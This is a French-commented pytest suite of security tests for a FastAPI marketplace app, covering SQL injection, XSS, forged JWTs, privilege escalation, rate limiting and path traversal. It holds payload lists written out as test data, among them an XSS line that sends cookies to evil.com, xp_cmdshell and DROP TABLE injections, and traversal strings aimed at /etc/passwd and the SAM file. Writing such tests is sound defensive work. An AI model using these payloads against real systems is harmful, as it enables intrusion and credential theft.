"""
Tests de Sécurité Complets

Couvre:
- Injection SQL
- XSS (Cross-Site Scripting)
- CSRF (Cross-Site Request Forgery)
- Authentication bypass
- Authorization bypass
- Rate limiting
- Input validation
- Sensitive data exposure
- Security headers
"""

import pytest
from fastapi.testclient import TestClient
from unittest.mock import patch, MagicMock
import json
import html
import re

try:
    from server import app
    HAS_APP = True
except ImportError:
    HAS_APP = False
    app = None


# ============================================
# FIXTURES
# ============================================

@pytest.fixture
def client():
    """Client de test FastAPI"""
    if not HAS_APP:
        pytest.skip("Server app not available")
    return TestClient(app)


@pytest.fixture
def auth_headers():
    """Headers d'authentification"""
    return {"Authorization": "Bearer valid-test-token"}


@pytest.fixture
def mock_supabase():
    """Mock du client Supabase"""
    with patch('supabase_client.supabase') as mock:
        yield mock


# ============================================
# TESTS INJECTION SQL
# ============================================

class TestSQLInjection:
    """Tests de prévention d'injection SQL"""

    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "'; DELETE FROM users WHERE '1'='1",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "admin' #",
        "1' OR '1' = '1",
        "1; UPDATE users SET role='admin'",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        "'; EXEC xp_cmdshell('dir'); --",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    ]

    def test_login_sql_injection(self, client, mock_supabase):
        """Injection SQL sur login"""
        mock_supabase.auth.sign_in_with_password.side_effect = Exception("Invalid")

        for payload in self.SQL_INJECTION_PAYLOADS:
            response = client.post("/api/auth/login", json={
                "email": payload,
                "password": payload
            })
            # Ne doit pas retourner 500 (erreur serveur)
            assert response.status_code != 500, f"SQL injection vulnerability with: {payload}"
            assert response.status_code in [400, 401, 422]

    def test_search_sql_injection(self, client, auth_headers, mock_supabase):
        """Injection SQL sur recherche"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            for payload in self.SQL_INJECTION_PAYLOADS:
                response = client.get(
                    f"/api/products/search?q={payload}",
                    headers=auth_headers
                )
                assert response.status_code != 500, f"SQL injection in search: {payload}"

    def test_filter_sql_injection(self, client, auth_headers, mock_supabase):
        """Injection SQL sur filtres"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            for payload in self.SQL_INJECTION_PAYLOADS:
                response = client.get(
                    f"/api/commissions?status={payload}",
                    headers=auth_headers
                )
                assert response.status_code != 500, f"SQL injection in filter: {payload}"

    def test_order_by_sql_injection(self, client, auth_headers, mock_supabase):
        """Injection SQL sur ORDER BY"""
        payloads = [
            "created_at; DROP TABLE users",
            "created_at DESC; DELETE FROM users",
            "(SELECT password FROM users LIMIT 1)",
            "1,extractvalue(1,concat(0x7e,version()))"
        ]

        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            for payload in payloads:
                response = client.get(
                    f"/api/products?sort={payload}",
                    headers=auth_headers
                )
                assert response.status_code != 500


# ============================================
# TESTS XSS
# ============================================

class TestXSS:
    """Tests de prévention XSS"""

    XSS_PAYLOADS = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "javascript:alert('xss')",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert('xss')>",
        "'-alert(1)-'",
        "\"onmouseover=\"alert(1)",
        "<img src=\"x\" onerror=\"alert('XSS')\">",
        "<ScRiPt>alert('xss')</ScRiPt>",
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
        "<div style=\"background:url(javascript:alert('xss'))\">",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
    ]

    def test_user_input_xss_sanitization(self, client, auth_headers, mock_supabase):
        """Sanitization XSS sur entrées utilisateur"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            mock_supabase.table.return_value.insert.return_value.execute.return_value = MagicMock(
                data=[{"id": "prod-123"}]
            )

            for payload in self.XSS_PAYLOADS:
                response = client.post(
                    "/api/products",
                    json={
                        "title": payload,
                        "description": payload,
                        "price": 100
                    },
                    headers=auth_headers
                )

                if response.status_code in [200, 201]:
                    data = response.json()
                    # Le payload ne devrait pas être retourné tel quel
                    response_text = json.dumps(data)
                    assert "<script>" not in response_text.lower()
                    assert "onerror=" not in response_text.lower()

    def test_search_results_xss(self, client, auth_headers, mock_supabase):
        """XSS dans résultats de recherche"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            for payload in self.XSS_PAYLOADS:
                response = client.get(
                    f"/api/products/search?q={payload}",
                    headers=auth_headers
                )

                if response.status_code == 200:
                    response_text = response.text
                    # Le payload ne devrait pas être renvoyé sans échappement
                    assert payload not in response_text or html.escape(payload) in response_text

    def test_error_message_xss(self, client, mock_supabase):
        """XSS dans messages d'erreur"""
        for payload in self.XSS_PAYLOADS:
            response = client.post("/api/auth/login", json={
                "email": payload,
                "password": "test"
            })

            if response.status_code in [400, 422]:
                response_text = response.text
                # Le message d'erreur ne devrait pas inclure le payload brut
                assert "<script>" not in response_text.lower()


# ============================================
# TESTS CSRF
# ============================================

class TestCSRF:
    """Tests de protection CSRF"""

    def test_state_changing_requires_csrf_or_auth(self, client):
        """Opérations de modification nécessitent protection"""
        state_changing_endpoints = [
            ("/api/products", "POST"),
            ("/api/user/profile", "PUT"),
            ("/api/payouts/request", "POST"),
            ("/api/auth/logout", "POST"),
        ]

        for endpoint, method in state_changing_endpoints:
            if method == "POST":
                response = client.post(endpoint, json={})
            elif method == "PUT":
                response = client.put(endpoint, json={})
            elif method == "DELETE":
                response = client.delete(endpoint)

            # Devrait nécessiter une authentification
            assert response.status_code in [401, 403, 404, 405, 422]

    def test_origin_header_validation(self, client, auth_headers):
        """Validation de l'en-tête Origin"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            # Origine malveillante
            malicious_headers = {
                **auth_headers,
                "Origin": "https://evil-site.com"
            }

            response = client.post(
                "/api/user/profile",
                json={"name": "Test"},
                headers=malicious_headers
            )

            # Devrait être rejeté ou géré par CORS
            # (code 200 est OK si CORS est bien configuré)


# ============================================
# TESTS AUTHENTICATION BYPASS
# ============================================

class TestAuthenticationBypass:
    """Tests de contournement d'authentification"""

    def test_jwt_none_algorithm(self, client):
        """Protection contre algorithm:none JWT"""
        # Token avec algorithm=none
        fake_token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."

        response = client.get(
            "/api/user/profile",
            headers={"Authorization": f"Bearer {fake_token}"}
        )

        assert response.status_code in [401, 403, 404]

    def test_jwt_algorithm_confusion(self, client):
        """Protection contre confusion d'algorithme JWT"""
        # Token signé avec une clé publique comme secret
        confusing_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.invalid"

        response = client.get(
            "/api/admin/users",
            headers={"Authorization": f"Bearer {confusing_token}"}
        )

        assert response.status_code in [401, 403, 404]

    def test_expired_token_rejected(self, client):
        """Tokens expirés sont rejetés"""
        # Token expiré (exp dans le passé)
        expired_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyLTEyMyIsImV4cCI6MTYwMDAwMDAwMH0.sig"

        response = client.get(
            "/api/user/profile",
            headers={"Authorization": f"Bearer {expired_token}"}
        )

        assert response.status_code in [401, 403, 404]

    def test_modified_token_rejected(self, client):
        """Tokens modifiés sont rejetés"""
        # Token avec payload modifié mais même signature
        modified_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.orig_sig"

        response = client.get(
            "/api/admin/users",
            headers={"Authorization": f"Bearer {modified_token}"}
        )

        assert response.status_code in [401, 403, 404]


# ============================================
# TESTS AUTHORIZATION BYPASS
# ============================================

class TestAuthorizationBypass:
    """Tests de contournement d'autorisation"""

    def test_vertical_privilege_escalation(self, client, mock_supabase):
        """Élévation de privilèges verticale"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            # Un influenceur ne devrait pas accéder aux endpoints admin
            admin_endpoints = [
                "/api/admin/users",
                "/api/admin/payouts",
                "/api/admin/analytics",
                "/api/admin/registrations/pending"
            ]

            for endpoint in admin_endpoints:
                response = client.get(
                    endpoint,
                    headers={"Authorization": "Bearer user-token"}
                )
                assert response.status_code in [401, 403, 404]

    def test_horizontal_privilege_escalation(self, client, mock_supabase):
        """Élévation de privilèges horizontale (IDOR)"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            # Accéder aux données d'un autre utilisateur
            response = client.get(
                "/api/users/user-456/commissions",  # Autre utilisateur
                headers={"Authorization": "Bearer user-123-token"}
            )

            # Devrait être refusé ou retourner uniquement ses propres données
            assert response.status_code in [200, 401, 403, 404]
            if response.status_code == 200:
                data = response.json()
                # Vérifier qu'on ne voit pas les données d'un autre utilisateur
                if isinstance(data, list):
                    for item in data:
                        if "user_id" in item:
                            assert item["user_id"] == "user-123"

    def test_role_tampering_in_request(self, client, mock_supabase):
        """Tentative de modification du rôle dans la requête"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            # Tenter de modifier son propre rôle
            response = client.put(
                "/api/user/profile",
                json={"role": "admin"},
                headers={"Authorization": "Bearer user-token"}
            )

            # Le rôle ne devrait pas être modifiable
            if response.status_code in [200]:
                data = response.json()
                if "role" in data:
                    assert data["role"] != "admin"


# ============================================
# TESTS RATE LIMITING
# ============================================

class TestRateLimiting:
    """Tests de limitation de débit"""

    def test_login_rate_limiting(self, client, mock_supabase):
        """Rate limiting sur login"""
        mock_supabase.auth.sign_in_with_password.side_effect = Exception("Invalid")

        responses = []
        for i in range(30):
            response = client.post("/api/auth/login", json={
                "email": "test@example.com",
                "password": f"wrong{i}"
            })
            responses.append(response.status_code)

        # Devrait avoir au moins un 429 après plusieurs tentatives
        assert 429 in responses or all(r in [400, 401] for r in responses)

    def test_api_rate_limiting(self, client, auth_headers, mock_supabase):
        """Rate limiting sur API générale"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            responses = []
            for i in range(100):
                response = client.get("/api/products", headers=auth_headers)
                responses.append(response.status_code)

            # Devrait avoir un 429 si rate limiting est actif
            # Ou tous 200/404 si pas de rate limiting


# ============================================
# TESTS INPUT VALIDATION
# ============================================

class TestInputValidation:
    """Tests de validation des entrées"""

    def test_oversized_payload_rejected(self, client, auth_headers):
        """Payloads trop grands rejetés"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            large_payload = {
                "title": "A" * 100000,
                "description": "B" * 1000000
            }

            response = client.post(
                "/api/products",
                json=large_payload,
                headers=auth_headers
            )

            assert response.status_code in [400, 413, 422]

    def test_null_byte_injection(self, client, auth_headers, mock_supabase):
        """Protection contre injection null byte"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            payloads = [
                "file.jpg\x00.php",
                "test\x00admin",
                "../\x00../etc/passwd"
            ]

            for payload in payloads:
                response = client.post(
                    "/api/products",
                    json={"title": payload},
                    headers=auth_headers
                )
                # Ne devrait pas causer d'erreur serveur
                assert response.status_code != 500

    def test_unicode_normalization(self, client, auth_headers, mock_supabase):
        """Normalisation Unicode"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            # Caractères Unicode confusables
            payloads = [
                "аdmin",  # 'а' cyrillique
                "admin\u200b",  # Zero-width space
                "a\u0307dmin",  # Combining dot above
            ]

            for payload in payloads:
                response = client.post("/api/auth/login", json={
                    "email": f"{payload}@example.com",
                    "password": "test"
                })
                # Devrait gérer correctement
                assert response.status_code != 500


# ============================================
# TESTS SENSITIVE DATA EXPOSURE
# ============================================

class TestSensitiveDataExposure:
    """Tests d'exposition de données sensibles"""

    def test_password_not_in_response(self, client, auth_headers, mock_supabase):
        """Mot de passe jamais retourné"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            mock_supabase.table.return_value.select.return_value.eq.return_value.single.return_value.execute.return_value = MagicMock(
                data={"id": "user-123", "email": "test@example.com", "password_hash": "secret"}
            )

            response = client.get("/api/user/profile", headers=auth_headers)

            if response.status_code == 200:
                response_text = response.text.lower()
                assert "password" not in response_text or "null" in response_text
                assert "password_hash" not in response_text

    def test_internal_ids_not_exposed(self, client, auth_headers, mock_supabase):
        """IDs internes non exposés"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            response = client.get("/api/products", headers=auth_headers)

            if response.status_code == 200:
                response_text = response.text
                # Ne devrait pas exposer les clés API ou secrets
                patterns_to_avoid = [
                    r'sk_live_[a-zA-Z0-9]+',  # Stripe secret key
                    r'[a-f0-9]{64}',  # Long hex strings (potential secrets)
                    r'password["\s:]+["\'][^"\']+["\']',  # Password fields
                ]
                for pattern in patterns_to_avoid:
                    matches = re.findall(pattern, response_text, re.IGNORECASE)
                    # Devrait être vide ou ne pas être des vrais secrets

    def test_stack_traces_not_exposed(self, client):
        """Stack traces non exposés en production"""
        # Provoquer une erreur
        response = client.get("/api/nonexistent/endpoint/that/should/error")

        response_text = response.text.lower()
        # Ne devrait pas contenir de stack trace
        assert "traceback" not in response_text
        assert "file \"" not in response_text
        assert "line " not in response_text or "line" in response_text


# ============================================
# TESTS SECURITY HEADERS
# ============================================

class TestSecurityHeaders:
    """Tests des en-têtes de sécurité"""

    def test_cors_headers(self, client):
        """En-têtes CORS présents"""
        response = client.options("/api/auth/login")

        # CORS devrait être configuré
        headers = response.headers
        # Vérifier la présence des headers CORS si configurés

    def test_content_type_header(self, client, auth_headers, mock_supabase):
        """En-tête Content-Type correct"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            response = client.get("/api/products", headers=auth_headers)

            if response.status_code == 200:
                content_type = response.headers.get("content-type", "")
                assert "application/json" in content_type

    def test_no_cache_on_sensitive_endpoints(self, client, auth_headers, mock_supabase):
        """Pas de cache sur endpoints sensibles"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            sensitive_endpoints = [
                "/api/user/profile",
                "/api/commissions",
                "/api/payouts"
            ]

            for endpoint in sensitive_endpoints:
                response = client.get(endpoint, headers=auth_headers)

                if response.status_code == 200:
                    cache_control = response.headers.get("cache-control", "")
                    # Devrait avoir no-store ou no-cache pour données sensibles


# ============================================
# TESTS PATH TRAVERSAL
# ============================================

class TestPathTraversal:
    """Tests de traversée de chemin"""

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
    ]

    def test_file_path_traversal(self, client, auth_headers, mock_supabase):
        """Protection contre traversée de chemin"""
        with patch('auth.get_current_user', return_value={"id": "user-123", "role": "influencer"}):
            for payload in self.PATH_TRAVERSAL_PAYLOADS:
                response = client.get(
                    f"/api/files/{payload}",
                    headers=auth_headers
                )
                # Ne devrait pas retourner de fichier système
                assert response.status_code in [400, 403, 404]
                assert "/etc/passwd" not in response.text
                assert "root:" not in response.text


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
